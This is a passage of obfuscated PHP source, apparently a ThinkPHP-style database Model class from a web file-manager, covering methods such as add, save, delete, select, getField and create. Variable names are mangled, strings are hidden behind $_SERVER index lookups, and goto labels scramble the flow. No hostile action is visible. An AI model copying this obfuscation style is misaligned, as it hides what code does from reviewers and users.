İ´§¶[12]; } if ($‰¸İˆ [$Ş İ´§¶[33]] == $Ş İ´§¶[2115] && isset($µÏùÍ¾›[$Ş İ´§¶[431]])) { $ÅÊÓ†Óª[] = $µÏùÍ¾›[$Ş İ´§¶[431]] . $Ş İ´§¶[12]; } } $ÅÊÓ†Óª = array_merge($ÅÊÓ†Óª, $ğ§¶™¹ƒ, array($Õ½²¶ÃÂ . $Ş İ´§¶[12])); $ÅÊÓ†Óª = array_unique($ÅÊÓ†Óª); $Í€á´ê„ = array_unique(array_to_keyvalue($©ó…•®, $Ş İ´§¶[12], $Ş İ´§¶[1687])); $Šˆ±£Ã = Model($Ş İ´§¶[554])->userListInfo($Í€á´ê„); $úß¯”ò¶ = Model($Ş İ´§¶[865])->sourceListInfo($ÅÊÓ†Óª, !0); foreach ($©ó…•® as &$‰¸İˆ ) { if ($‰¸İˆ [$Ş İ´§¶[33]] == $Ş İ´§¶[577] && isset($‰¸İˆ [$Ş İ´§¶[482]][$Ş İ´§¶[1205]])) { $‰¸İˆ [$Ş İ´§¶[482]][$Ş İ´§¶[1205]] = $úß¯”ò¶[$‰¸İˆ [$Ş İ´§¶[482]][$Ş İ´§¶[1205]]]; $‰¸İˆ [$Ş İ´§¶[482]][$Ş İ´§¶[1206]] = $úß¯”ò¶[$‰¸İˆ [$Ş İ´§¶[482]][$Ş İ´§¶[1206]]]; } if ($‰¸İˆ [$Ş İ´§¶[33]] == $Ş İ´§¶[2115] && isset($‰¸İˆ [$Ş İ´§¶[482]][$Ş İ´§¶[431]])) { $‰¸İˆ [$Ş İ´§¶[482]][$Ş İ´§¶[431]] = $úß¯”ò¶[$‰¸İˆ [$Ş İ´§¶[482]][$Ş İ´§¶[431]]]; } $‰¸İˆ [$Ş İ´§¶[87]] = $úß¯”ò¶[$‰¸İˆ [$Ş İ´§¶[431]]]; $‰¸İˆ [$Ş İ´§¶[2120]] = $úß¯”ò¶[$‰¸İˆ [$Ş İ´§¶[2105]]]; if ($‰¸İˆ [$Ş İ´§¶[33]] == $Ş İ´§¶[1846]) { $‰¸İˆ [$Ş İ´§¶[2120]] = $‰¸İˆ [$Ş İ´§¶[87]]; $‰¸İˆ [$Ş İ´§¶[2105]] = $‰¸İˆ [$Ş İ´§¶[2120]][$Ş İ´§¶[431]]; $‰¸İˆ [$Ş İ´§¶[87]] = !1; $‰¸İˆ [$Ş İ´§¶[431]] = $Ş İ´§¶[12]; } $‰¸İˆ [$Ş İ´§¶[2049]] = $Šˆ±£Ã[$‰¸İˆ [$Ş İ´§¶[1687]]]; } unset($‰¸İˆ ); $á‡“…ÚÇ[$Ş İ´§¶[398]] = $©ó…•®; return $á‡“…ÚÇ; } public function removeBySource($œÅ²Ã½ ) { $–™À­şº = array($_SERVER[…É¦À–][446] => $œÅ²Ã½ ); $this->where($–™À­şº)->remove(); } } goto bÚ‹†¡ÙÕ; c¦¿‡¾ËèÀ: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\x6c\x65", "\x6f\x72\144\x65\162", "\141\154\x69\141\163", "\150\x61\166\151\x6e\147", "\147\162\157\165\160", "\154\x6f\143\153", "\144\x69\163\x74\151\156\x63\x74", "\141\x75\164\157", "\146\x69\x6c\x74\145\162", "\x76\141\154\151\144\141\164\145", "\162\145\x73\165\154\164", "\x62\151\156\x64", "\x74\x6f\153\145\156"); public function __construct($‰õ¬Ñø› = '', $ñì‹ÛÕ’ = '', $¥—ãªÚş = '') { $õÔÖÊÑé =& $_SERVER[…É¦À–]; $this->_initialize(); if (!empty($‰õ¬Ñø›)) { if (strpos($‰õ¬Ñø›, $õÔÖÊÑé[10])) { list($this->dbName, $this->name) = explode($õÔÖÊÑé[10], $‰õ¬Ñø›); } else { $this->name = $‰õ¬Ñø›; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ñì‹ÛÕ’)) { $this->tablePrefix = $õÔÖÊÑé[12]; } elseif ($õÔÖÊÑé[12] != $ñì‹ÛÕ’) { $this->tablePrefix = $ñì‹ÛÕ’; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($õÔÖÊÑé[273]); } $this->db(0, empty($this->connection) ? $¥—ãªÚş : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Ú÷ôñ¾¨ =& $_SERVER[…É¦À–]; if (empty($this->fields)) { if (think_config($Ú÷ôñ¾¨[274])) { $¤†©Á¾å = $this->dbName ? $this->dbName : think_config($Ú÷ôñ¾¨[275]); $£½—¼¶Ó = think_var_cache($Ú÷ôñ¾¨[276] . strtolower(get_path_this($¤†©Á¾å) . $Ú÷ôñ¾¨[10] . $this->name)); if ($£½—¼¶Ó) { $ë“ÆšŞĞ = think_config($Ú÷ôñ¾¨[277]); if (empty($ë“ÆšŞĞ) || $£½—¼¶Ó[$Ú÷ôñ¾¨[278]] == $ë“ÆšŞĞ) { $this->fields = $£½—¼¶Ó; return; } } } $this->flush(); } } public function flush() { $ÃäÊü±‰ =& $_SERVER[…É¦À–]; $this->db->setModel($this->name); $ŸîÎáá¦ = $this->db->getFields($this->getTableName()); if (!$ŸîÎáá¦) { return !1; } $this->fields = array_keys($ŸîÎáá¦); $this->fields[$ÃäÊü±‰[279]] = !1; foreach ($ŸîÎáá¦ as $¾½ËµßØ => $¦Âûíß) { $ô½òÄÖ¾[$¾½ËµßØ] = $¦Âûíß[$ÃäÊü±‰[33]]; if ($¦Âûíß[$ÃäÊü±‰[39]]) { $this->fields[$ÃäÊü±‰[280]] = $¾½ËµßØ; if ($¦Âûíß[$ÃäÊü±‰[42]]) { $this->fields[$ÃäÊü±‰[279]] = !0; } } } $this->fields[$ÃäÊü±‰[281]] = $ô½òÄÖ¾; if (think_config($ÃäÊü±‰[277])) { $this->fields[$ÃäÊü±‰[278]] = think_config($ÃäÊü±‰[277]); } if (think_config($ÃäÊü±‰[274])) { $œ³âÄáÒ = $this->dbName ? $this->dbName : think_config($ÃäÊü±‰[275]); think_var_cache($ÃäÊü±‰[276] . strtolower(get_path_this($œ³âÄáÒ) . $ÃäÊü±‰[10] . $this->name), $this->fields); } } public function switchModel($ºŸİ‚à, $±ë‘ú„ = array()) { $”ÁşŸ˜ =& $_SERVER[…É¦À–]; $ ®¶¹¾ = ucwords(strtolower($ºŸİ‚à)) . $”ÁşŸ˜[282]; if (!class_exists($ ®¶¹¾)) { think_exception($ ®¶¹¾ . think_lang($”ÁşŸ˜[283])); } $this->_extModel = new $ ®¶¹¾($this->name); if (!empty($±ë‘ú„)) { foreach ($±ë‘ú„ as $Óè¢õ¯ï) { $this->_extModel->setProperty($Óè¢õ¯ï, $this->{$Óè¢õ¯ï}); } } return $this->_extModel; } public function __set($âÚÚº»Å, $êåšĞñ¯) { $this->data[$âÚÚº»Å] = $êåšĞñ¯; } public function __get($é»õæ×) { return isset($this->data[$é»õæ×]) ? $this->data[$é»õæ×] : null; } public function __isset($Ê¼Ñò) { return isset($this->data[$Ê¼Ñò]); } public function __unset($åéŒ³Ñ®) { unset($this->data[$åéŒ³Ñ®]); } public function __call($Üİçò“º, $çšÄáõƒ) { $Í¶ûÖÜ =& $_SERVER[…É¦À–]; if (in_array(strtolower($Üİçò“º), $this->methods, !0)) { $this->options[strtolower($Üİçò“º)] = $çšÄáõƒ[0]; return $this; } elseif (in_array(strtolower($Üİçò“º), array($Í¶ûÖÜ[284], $Í¶ûÖÜ[285], $Í¶ûÖÜ[286], $Í¶ûÖÜ[287], $Í¶ûÖÜ[288]), !0)) { $Ò½õºÅ• = isset($çšÄáõƒ[0]) ? $çšÄáõƒ[0] : $Í¶ûÖÜ[189]; $Ò½õºÅ• = $this->db->parseKey($Ò½õºÅ•); return $this->getField(strtoupper($Üİçò“º) . $Í¶ûÖÜ[289] . $Ò½õºÅ• . $Í¶ûÖÜ[290] . $Üİçò“º, $Í¶ûÖÜ[284]); } elseif (strtolower(substr($Üİçò“º, 0, 5)) == $Í¶ûÖÜ[291]) { $Ò½õºÅ• = think_parse_name(substr($Üİçò“º, 5)); $ı¤­Üò¶[$Ò½õºÅ•] = $çšÄáõƒ[0]; return $this->where($ı¤­Üò¶)->find(); } elseif (strtolower(substr($Üİçò“º, 0, 10)) == $Í¶ûÖÜ[292]) { $¡‹Ğ†àå = think_parse_name(substr($Üİçò“º, 10)); $ı¤­Üò¶[$¡‹Ğ†àå] = $çšÄáõƒ[0]; return $this->where($ı¤­Üò¶)->getField($çšÄáõƒ[1]); } elseif (isset($this->_scope[$Üİçò“º])) { return $this->scope($Üİçò“º, $çšÄáõƒ[0]); } elseif (method_exists($this, $Üİçò“º)) { array_unshift($çšÄáõƒ, $Üİçò“º); return call_user_func_array(array($this, $Í¶ûÖÜ[293]), $çšÄáõƒ); } else { return call_user_func_array(array(parent, $Üİçò“º), $çšÄáõƒ); } } protected function call() { $µŸ®–ùü =& $_SERVER[…É¦À–]; $úÙè³Ÿ‹ = func_get_args(); $Ê‚½ˆ‚ = array_shift($úÙè³Ÿ‹); $¹¡úİ»Ç = $Ê‚½ˆ‚; if (is_array($Ê‚½ˆ‚)) { $¹¡úİ»Ç = $Ê‚½ˆ‚[1]; $Ê‚½ˆ‚ = $Ê‚½ˆ‚[0]; } $ü×—”­™ = count($úÙè³Ÿ‹) - 1; if (isset($úÙè³Ÿ‹[$ü×—”­™]) && $úÙè³Ÿ‹[$ü×—”­™] === $Ê‚½ˆ‚) { think_exception(__CLASS__ . $µŸ®–ùü[4] . $Ê‚½ˆ‚ . think_lang($µŸ®–ùü[294])); return; } $úÙè³Ÿ‹[] = $Ê‚½ˆ‚; if (method_exists($this, $µŸ®–ùü[295])) { $ƒ’çªƒ = call_user_func_array(array($this, $µŸ®–ùü[296]), array($¹¡úİ»Ç, $úÙè³Ÿ‹)); if (!is_null($ƒ’çªƒ) && $ƒ’çªƒ !== !1) { return $ƒ’çªƒ; } } $àÀ©…ë¾ = call_user_func_array(array($this, $Ê‚½ˆ‚), $úÙè³Ÿ‹); if (method_exists($this, $µŸ®–ùü[297])) { $ƒ’çªƒ = call_user_func_array(array($this, $µŸ®–ùü[298]), array($¹¡úİ»Ç, $úÙè³Ÿ‹, $àÀ©…ë¾)); if ($ƒ’çªƒ) { return $ƒ’çªƒ; } } return $àÀ©…ë¾; } protected function _initialize() { } protected function _facade($ü¯ãÖ¾û) { $ÚÕû“Û§ =& $_SERVER[…É¦À–]; if (!empty($this->fields)) { foreach ($ü¯ãÖ¾û as $Äğˆ³ => $È›ößš) { if (is_array($this->fields) && !in_array($Äğˆ³, $this->fields, !0)) { unset($ü¯ãÖ¾û[$Äğˆ³]); } elseif (is_scalar($È›ößš)) { $this->_parseType($ü¯ãÖ¾û, $Äğˆ³); } } } if (!empty($this->options[$ÚÕû“Û§[299]])) { $ü¯ãÖ¾û = array_map($this->options[$ÚÕû“Û§[299]], $ü¯ãÖ¾û); unset($this->options[$ÚÕû“Û§[299]]); } $this->_beforeWrite($ü¯ãÖ¾û); return $ü¯ãÖ¾û; } protected function _beforeWrite(&$ö¬ü¼½) { } public function add($ÕªöÚò¸ = '', $…øğ€ô = array(), $µª§œñÈ = false) { if (empty($ÕªöÚò¸)) { if (!empty($this->data)) { $ÕªöÚò¸ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[…É¦À–][300]); return !1; } } $…øğ€ô = $this->_parseOptions($…øğ€ô); $ÕªöÚò¸ = $this->_facade($ÕªöÚò¸); if (!1 === $this->_beforeInsert($ÕªöÚò¸, $…øğ€ô)) { return !1; } $™»¢×’È = $this->db->insert($ÕªöÚò¸, $…øğ€ô, $µª§œñÈ); if (!1 !== $™»¢×’È) { $¼Øµïûš = $this->getLastInsID(); if ($¼Øµïûš) { $ÕªöÚò¸[$this->getPk()] = $¼Øµïûš; $this->_after_insert($ÕªöÚò¸, $…øğ€ô); return $¼Øµïûš; } $this->_after_insert($ÕªöÚò¸, $…øğ€ô); } return $™»¢×’È; } protected function _beforeInsert(&$ğŠ†„ÙÌ, $Îµ¡äß—) { } protected function _after_insert($¥¹ Šç¾, $ûşÇ¢•Ï) { } public function addAll($ÂÎ¼óÇ, $ıî™âŠ = array(), $¦ù´·Î’ = false) { $ŞŞËˆàç =& $_SERVER[…É¦À–]; if (empty($ÂÎ¼óÇ)) { $this->error = think_lang($ŞŞËˆàç[300]); return !1; } $ıî™âŠ = $this->_parseOptions($ıî™âŠ); foreach ($ÂÎ¼óÇ as $ Ó½‚€¶ => $¦±¯¡¹‹) { $ÂÎ¼óÇ[$ Ó½‚€¶] = $this->_facade($¦±¯¡¹‹); } if (method_exists($this->db, $ŞŞËˆàç[301])) { $â›àõäÁ = $this->db->insertAll($ÂÎ¼óÇ, $ıî™âŠ, $¦ù´·Î’); } else { $this->startTrans(); foreach ($ÂÎ¼óÇ as $ Ó½‚€¶ => $¦±¯¡¹‹) { $â›àõäÁ = $this->db->insert($¦±¯¡¹‹, $ıî™âŠ, $¦ù´·Î’); } $this->commit(); } if (!1 !== $â›àõäÁ) { $ÏÏÌˆàÃ = $this->getLastInsID(); if ($ÏÏÌˆàÃ) { return $ÏÏÌˆàÃ; } } return $â›àõäÁ; } public function selectAdd($ÙúúÌÜÔ = '', $Ó˜åá— = '', $ûÌ±Ìİ¶ = array()) { $ãÁŞÊ =& $_SERVER[…É¦À–]; $ûÌ±Ìİ¶ = $this->_parseOptions($ûÌ±Ìİ¶); if (!1 === ($éªÙÕ£ = $this->db->selectInsert($ÙúúÌÜÔ ? $ÙúúÌÜÔ : $ûÌ±Ìİ¶[$ãÁŞÊ[302]], $Ó˜åá— ? $Ó˜åá— : $this->getTableName(), $ûÌ±Ìİ¶))) { $this->error = think_lang($ãÁŞÊ[303]); return !1; } else { return $éªÙÕ£; } } public function save($çºáèçÍ = '', $à¼¬Ş = array()) { $ïÃÕ·á¦ =& $_SERVER[…É¦À–]; if (empty($çºáèçÍ)) { if (!empty($this->data)) { $çºáèçÍ = $this->data; $this->data = array(); } else { $this->error = think_lang($ïÃÕ·á¦[300]); return !1; } } $çºáèçÍ = $this->_facade($çºáèçÍ); $à¼¬Ş = $this->_parseOptions($à¼¬Ş); $…ŸŠ­€“ = $this->getPk(); if (!isset($à¼¬Ş[$ïÃÕ·á¦[304]])) { if (isset($çºáèçÍ[$…ŸŠ­€“])) { $ó—Èˆ ©[$…ŸŠ­€“] = $çºáèçÍ[$…ŸŠ­€“]; $à¼¬Ş[$ïÃÕ·á¦[304]] = $ó—Èˆ ©; unset($çºáèçÍ[$…ŸŠ­€“]); } else { $this->error = think_lang($ïÃÕ·á¦[303]); return !1; } } if (is_array($à¼¬Ş[$ïÃÕ·á¦[304]]) && isset($à¼¬Ş[$ïÃÕ·á¦[304]][$…ŸŠ­€“])) { $î¬ğšĞ¥ = $à¼¬Ş[$ïÃÕ·á¦[304]][$…ŸŠ­€“]; } if (!1 === $this->_beforeUpdate($çºáèçÍ, $à¼¬Ş)) { return !1; } $×Ìó…° = $this->db->update($çºáèçÍ, $à¼¬Ş); if (!1 !== $×Ìó…°) { if (isset($î¬ğšĞ¥)) { $çºáèçÍ[$…ŸŠ­€“] = $î¬ğšĞ¥; } $this->_afterUpdate($çºáèçÍ, $à¼¬Ş); } return $×Ìó…°; } protected function _beforeUpdate(&$¼ÌÂ†×í, $ñ²ªÆêÒ) { } protected function _afterUpdate($¹Á÷Åô», $‘à¼ñ±») { } public function delete($ªïÀ¼¦• = array()) { $è®âš–Ó =& $_SERVER[…É¦À–]; if (empty($ªïÀ¼¦•) && empty($this->options[$è®âš–Ó[304]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $Î©ÓÚ›³ = $this->getPk(); if (is_numeric($ªïÀ¼¦•) || is_string($ªïÀ¼¦•)) { if (strpos($ªïÀ¼¦•, $è®âš–Ó[50])) { $Ä¦ÛøŒ[$Î©ÓÚ›³] = array($è®âš–Ó[305], $ªïÀ¼¦•); } else { $Ä¦ÛøŒ[$Î©ÓÚ›³] = $ªïÀ¼¦•; } $this->options[$è®âš–Ó[304]] = $Ä¦ÛøŒ; } $ªïÀ¼¦• = $this->_parseOptions(); if (is_array($ªïÀ¼¦•[$è®âš–Ó[304]]) && isset($ªïÀ¼¦•[$è®âš–Ó[304]][$Î©ÓÚ›³])) { $Íƒó“¼ú = $ªïÀ¼¦•[$è®âš–Ó[304]][$Î©ÓÚ›³]; } $Åš‘£€Ö = $this->db->delete($ªïÀ¼¦•); if (!1 !== $Åš‘£€Ö) { $£•àçíç = array(); if (isset($Íƒó“¼ú)) { $£•àçíç[$Î©ÓÚ›³] = $Íƒó“¼ú; } $this->_after_delete($£•àçíç, $ªïÀ¼¦•); } return $Åš‘£€Ö; } protected function _after_delete($ûÙùÌ´, $Öüµ´è­) { } public function select($ŞßÓ„òÚ = array()) { $©©Â÷»Œ =& $_SERVER[…É¦À–]; if (is_string($ŞßÓ„òÚ) || is_numeric($ŞßÓ„òÚ)) { $ÌÀÀÕËÆ = $this->getPk(); if (strpos($ŞßÓ„òÚ, $©©Â÷»Œ[50])) { $·º£éºİ[$ÌÀÀÕËÆ] = array($©©Â÷»Œ[305], $ŞßÓ„òÚ); } else { $·º£éºİ[$ÌÀÀÕËÆ] = $ŞßÓ„òÚ; } $this->options[$©©Â÷»Œ[304]] = $·º£éºİ; } elseif (!1 === $ŞßÓ„òÚ) { $ŞßÓ„òÚ = $this->_parseOptions(); return $©©Â÷»Œ[306] . $this->db->buildSelectSql($ŞßÓ„òÚ) . $©©Â÷»Œ[307]; } $ŞßÓ„òÚ = $this->_parseOptions(); $ÆŠ‚·–Ş = $this->db->select($ŞßÓ„òÚ); if (!1 === $ÆŠ‚·–Ş) { return !1; } if (empty($ÆŠ‚·–Ş)) { return null; } $this->_afterSelect($ÆŠ‚·–Ş, $ŞßÓ„òÚ); return $ÆŠ‚·–Ş; } protected function _afterSelect(&$øÈ°Ä”ƒ, $Í¡¨ÜñÅ) { } public function buildSql($ö°Àæ×Ã = array()) { $¡ŠÛé±û =& $_SERVER[…É¦À–]; $ö°Àæ×Ã = $this->_parseOptions($ö°Àæ×Ã); return $¡ŠÛé±û[306] . $this->db->buildSelectSql($ö°Àæ×Ã) . $¡ŠÛé±û[307]; } public function optionsValue($æÒô‘İà = null) { if (is_null($æÒô‘İà)) { return $this->options; } elseif (is_array($æÒô‘İà)) { $this->options = array_merge($this->options, $æÒô‘İà); } } protected function _parseOptions($ÅæçëãØ = array()) { $ÉöÛ¢ =& $_SERVER[…É¦À–]; if (is_array($ÅæçëãØ)) { $ÅæçëãØ = array_merge($this->options, $ÅæçëãØ); } $this->options = array(); if (!isset($ÅæçëãØ[$ÉöÛ¢[308]])) { $ÅæçëãØ[$ÉöÛ¢[308]] = $this->getTableName(); $©šâò®ï = $this->fields; } else { $©šâò®ï = $this->getDbFields(); } if (!empty($ÅæçëãØ[$ÉöÛ¢[309]])) { $ÅæçëãØ[$ÉöÛ¢[308]] .= $ÉöÛ¢[53] . $ÅæçëãØ[$ÉöÛ¢[309]]; } $ÅæçëãØ[$ÉöÛ¢[310]] = $this->name; if (isset($ÅæçëãØ[$ÉöÛ¢[304]]) && is_array($ÅæçëãØ[$ÉöÛ¢[304]]) && !empty($©šâò®ï) && !isset($ÅæçëãØ[$ÉöÛ¢[311]]) && !isset($ÅæçëãØ[$ÉöÛ¢[308]])) { foreach ($ÅæçëãØ[$ÉöÛ¢[304]] as $èÕÉåŞ¿ => $âµÄä‰ê) { $èÕÉåŞ¿ = trim($èÕÉåŞ¿); if (in_array($èÕÉåŞ¿, $©šâò®ï, !0)) { if (is_scalar($âµÄä‰ê)) { $this->_parseType($ÅæçëãØ[$ÉöÛ¢[304]], $èÕÉåŞ¿); } } elseif (!is_numeric($èÕÉåŞ¿) && $ÉöÛ¢[11] != substr($èÕÉåŞ¿, 0, 1) && !1 === strpos($èÕÉåŞ¿, $ÉöÛ¢[10]) && !1 === strpos($èÕÉåŞ¿, $ÉöÛ¢[289]) && !1 === strpos($èÕÉåŞ¿, $ÉöÛ¢[312]) && !1 === strpos($èÕÉåŞ¿, $ÉöÛ¢[313])) { unset($ÅæçëãØ[$ÉöÛ¢[304]][$èÕÉåŞ¿]); } } } $this->_options_filter($ÅæçëãØ); return $ÅæçëãØ; } protected function _options_filter(&$±®¥Ë«·) { } protected function _parseType(&$Ìƒ©æâ, $³Öœä«¤) { $Ë±Ñ«Äø =& $_SERVER[…É¦À–]; if (empty($this->options[$Ë±Ñ«Äø[314]][$Ë±Ñ«Äø[4] . $³Öœä«¤])) { $ÜëÅ»á¸ = strtolower($this->fields[$Ë±Ñ«Äø[281]][$³Öœä«¤]); if (!1 !== strpos($ÜëÅ»á¸, $Ë±Ñ«Äø[315])) { } elseif (!1 === strpos($ÜëÅ»á¸, $Ë±Ñ«Äø[316]) && !1 !== strpos($ÜëÅ»á¸, $Ë±Ñ«Äø[317])) { $Ìƒ©æâ[$³Öœä«¤] = intval($Ìƒ©æâ[$³Öœä«¤]); } elseif (!1 !== strpos($ÜëÅ»á¸, $Ë±Ñ«Äø[318]) || !1 !== strpos($ÜëÅ»á¸, $Ë±Ñ«Äø[319])) { $Ìƒ©æâ[$³Öœä«¤] = floatval($Ìƒ©æâ[$³Öœä«¤]); } elseif (!1 !== strpos($ÜëÅ»á¸, $Ë±Ñ«Äø[320])) { $Ìƒ©æâ[$³Öœä«¤] = (bool) $Ìƒ©æâ[$³Öœä«¤]; } } } public function find($ü—ğ¥˜ƒ = array()) { $âƒ—‘¦Ç =& $_SERVER[…É¦À–]; if (is_numeric($ü—ğ¥˜ƒ) || is_string($ü—ğ¥˜ƒ)) { $¥¨Óı¦€[$this->getPk()] = intval($ü—ğ¥˜ƒ); $this->options[$âƒ—‘¦Ç[304]] = $¥¨Óı¦€; } $this->options[$âƒ—‘¦Ç[321]] = 1; $ü—ğ¥˜ƒ = $this->_parseOptions(); $œô“³É¼ = $this->db->select($ü—ğ¥˜ƒ); if (!1 === $œô“³É¼) { return !1; } if (empty($œô“³É¼)) { return null; } $this->data = $œô“³É¼[0]; $this->_afterFind($this->data, $ü—ğ¥˜ƒ); if (!empty($this->options[$âƒ—‘¦Ç[322]])) { return $this->returnResult($this->data, $this->options[$âƒ—‘¦Ç[322]]); } return $this->data; } protected function _afterFind(&$äèÍØ¨, $Æ¢½ßê‰) { } protected function returnResult($ìô‰ü™æ, $ë’½¦öÇ = '') { $Ì˜‚ıãî =& $_SERVER[…É¦À–]; if ($ë’½¦öÇ) { if (is_callable($ë’½¦öÇ)) { return call_user_func($ë’½¦öÇ, $ìô‰ü™æ); } switch (strtolower($ë’½¦öÇ)) { case $Ì˜‚ıãî[323]: return json_encode($ìô‰ü™æ); case $Ì˜‚ıãî[324]: return xml_encode($ìô‰ü™æ); } } return $ìô‰ü™æ; } public function parseFieldsMap($’ˆƒÈ¹—, $­±÷ôóÓ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $şå·õ¨ => $®ıÄËÑ) { if ($­±÷ôóÓ == 1) { if (isset($’ˆƒÈ¹—[$®ıÄËÑ])) { $’ˆƒÈ¹—[$şå·õ¨] = $’ˆƒÈ¹—[$®ıÄËÑ]; unset($’ˆƒÈ¹—[$®ıÄËÑ]); } } else { if (isset($’ˆƒÈ¹—[$şå·õ¨])) { $’ˆƒÈ¹—[$®ıÄËÑ] = $’ˆƒÈ¹—[$şå·õ¨]; unset($’ˆƒÈ¹—[$şå·õ¨]); } } } } return $’ˆƒÈ¹—; } public function setField($¸ù®ŠØÈ, $ß›üŒó’ = '') { if (is_array($¸ù®ŠØÈ)) { $· Ùûœì = $¸ù®ŠØÈ; } else { $· Ùûœì[$¸ù®ŠØÈ] = $ß›üŒó’; } return $this->save($· Ùûœì); } public function setAdd($ˆ¶àá®†, $çŠĞØÙ = 1) { $ñùù÷¶õ =& $_SERVER[…É¦À–]; $äš¤Ç§â = $ˆ¶àá®† . $ñùù÷¶õ[325] . $çŠĞØÙ; if ($çŠĞØÙ < 0) { $äš¤Ç§â = $ˆ¶àá®† . $çŠĞØÙ; } return $this->setField($ˆ¶àá®†, array($ñùù÷¶õ[326], $äš¤Ç§â)); } public function getField($ø…µ ª, $ø„½ÒÌ = null) { $¤…ˆšæ´ =& $_SERVER[…É¦À–]; $“ú•Ò® [$¤…ˆšæ´[302]] = $ø…µ ª; $“ú•Ò®  = $this->_parseOptions($“ú•Ò® ); $ø…µ ª = trim($ø…µ ª); if (strpos($ø…µ ª, $¤…ˆšæ´[50])) { if (!isset($“ú•Ò® [$¤…ˆšæ´[321]])) { $“ú•Ò® [$¤…ˆšæ´[321]] = is_numeric($ø„½ÒÌ) ? $ø„½ÒÌ : $¤…ˆšæ´[12]; } $§ìü»ÄŸ = $this->db->select($“ú•Ò® ); if (!empty($§ìü»ÄŸ)) { $õÓ«ÁÊ³ = explode($¤…ˆšæ´[50], $ø…µ ª); $ø…µ ª = array_keys($§ìü»ÄŸ[0]); $õ¡×¾¸Õ = array_shift($ø…µ ª); $òÛ—şÌï = array_shift($ø…µ ª); $Ø‘Ãïİƒ = array(); $ûÁ˜şÇå = count($õÓ«ÁÊ³); foreach ($§ìü»ÄŸ as $™“Ñ¨¼Ü) { $Ö»Ş¼‰ = $™“Ñ¨¼Ü[$õ¡×¾¸Õ]; if (2 == $ûÁ˜şÇå) { $Ø‘Ãïİƒ[$Ö»Ş¼‰] = $™“Ñ¨¼Ü[$òÛ—şÌï]; } else { $Ø‘Ãïİƒ[$Ö»Ş¼‰] = is_string($ø„½ÒÌ) ? implode($ø„½ÒÌ, $™“Ñ¨¼Ü) : $™“Ñ¨¼Ü; } } return $Ø‘Ãïİƒ; } } else { if (!0 !== $ø„½ÒÌ) { $“ú•Ò® [$¤…ˆšæ´[321]] = is_numeric($ø„½ÒÌ) ? $ø„½ÒÌ : 1; } if ($ø„½ÒÌ === $¤…ˆšæ´[284]) { unset($“ú•Ò® [$¤…ˆšæ´[321]]); } $™“Ñ¨¼Ü = $this->db->select($“ú•Ò® ); if (!empty($™“Ñ¨¼Ü)) { if ($ø„½ÒÌ === $¤…ˆšæ´[284]) { return reset($™“Ñ¨¼Ü[0]); } if (!0 !== $ø„½ÒÌ && 1 == $“ú•Ò® [$¤…ˆšæ´[321]]) { return reset($™“Ñ¨¼Ü[0]); } foreach ($™“Ñ¨¼Ü as $•ˆß •—) { $ø¯¯Â[] = $•ˆß •—[$ø…µ ª]; } return $ø¯¯Â; } } return null; } public function create($»€Ü¥ô = '', $ïÇ×ƒ· = '') { $ºÕƒ­ûÒ =& $_SERVER[…É¦À–]; if (empty($»€Ü¥ô)) { $»€Ü¥ô = $_POST; } elseif (is_object($»€Ü¥ô)) { $»€Ü¥ô = get_object_vars($»€Ü¥ô); } if (empty($»€Ü¥ô) || !is_array($»€Ü¥ô)) { $this->error = think_lang($ºÕƒ­ûÒ[300]); return !1; } $»€Ü¥ô = $this->parseFieldsMap($»€Ü¥ô, 0); $ïÇ×ƒ· = $ïÇ×ƒ· ? $ïÇ×ƒ· : (!empty($»€Ü¥ô[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ºÕƒ­ûÒ[302]])) { $ë¾—”òÊ = $this->options[$ºÕƒ­ûÒ[302]]; unset($this->options[$ºÕƒ­ûÒ[302]]); } elseif ($ïÇ×ƒ· == THINK_MODEL_INSERT && isset($this->insertFields)) { $ë¾—”òÊ = $this->insertFields; } elseif ($ïÇ×ƒ· == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ë¾—”òÊ = $this->updateFields; } if (isset($ë¾—”òÊ)) { if (is_string($ë¾—”òÊ)) { $ë¾—”òÊ = explode($ºÕƒ­ûÒ[50], $ë¾—”òÊ); } if (think_config($ºÕƒ­ûÒ[327])) { $ë¾—”òÊ[] = think_config($ºÕƒ­ûÒ[328]); } foreach ($»€Ü¥ô as $ªı‡‘«î => $Ö¿…Æ ì) { if (!in_array($ªı‡‘«î, $ë¾—”òÊ)) { unset($»€Ü¥ô[$ªı‡‘«î]); } } } if (!$this->autoValidation($»€Ü¥ô, $ïÇ×ƒ·)) { return !1; } if (!$this->autoCheckToken($»€Ü¥ô)) { $this->error = think_lang($ºÕƒ­ûÒ[329]); return !1; } if ($this->autoCheckFields) { $ë¾—”òÊ = $this->getDbFields(); foreach ($»€Ü¥ô as $ªı‡‘«î => $Ö¿…Æ ì) { if (!in_array($ªı‡‘«î, $ë¾—”òÊ)) { unset($»€Ü¥ô[$ªı‡‘«î]); } elseif (MAGIC_QUOTES_GPC && is_string($Ö¿…Æ ì)) { $»€Ü¥ô[$ªı‡‘«î] = stripslashes($Ö¿…Æ ì); } } } $this->autoOperation($»€Ü¥ô, $ïÇ×ƒ·); $this->data = $»€Ü¥ô; return $»€Ü¥ô; } public function autoCheckToken($Ğ¡ü„áö) { $ÄÍ®† =& $_SERVER[…É¦À–]; if (isset($this->options[$ÄÍ®†[330]]) && !$this->options[$ÄÍ®†[330]]) { return !0; } if (think_config($ÄÍ®†[327])) { $º²ë½Ä = think_config($ÄÍ®†[328]); if (!isset($Ğ¡ü„áö[$º²ë½Ä]) || Session::get($º²ë½Ä)) { return !1; } list($áµ¡Ûà, $…›İ²ÍØ) = explode($ÄÍ®†[11], $Ğ¡ü„áö[$º²ë½Ä]); if ($…›İ²ÍØ && Session::get($º²ë½Ä . 